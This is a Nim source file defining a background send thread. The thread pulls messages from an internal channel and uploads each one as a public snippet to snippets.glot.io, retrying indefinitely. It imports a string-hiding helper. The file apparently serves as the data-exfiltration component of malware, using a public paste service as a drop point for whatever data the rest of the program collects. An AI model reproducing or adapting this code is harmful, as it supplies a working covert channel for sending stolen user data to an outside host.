import httpclient

import ../functions/hideString

from os import sleep

from ../channels import sendThreadChannel
from ../flags import SEND_THREAD_TRY_INTERVAL

proc send(data: string): void =
  let client: HttpClient = newHttpClient()

  client.headers = newHttpHeaders({"Content-Type": "application/json"})

  let body: string = "{\"public\": true,\"files\": [{\"content\": \"" & data & "\"}]}"

  let response = client.request(
     "https://snippets.glot.io/snippets",
    httpMethod = HttpPost,
    body = body
  )

  echo response.status

proc initSendThread*(): void {.thread.} =

  while true:
    let (dataAvaliable, msg) = sendThreadChannel.tryRecv()

    if dataAvaliable:
      var worked: bool = false

      while not worked:
        try:
          send msg
          worked = true
        except:
          sleep SEND_THREAD_TRY_INTERVAL

    sleep 10

  close sendThreadChannel
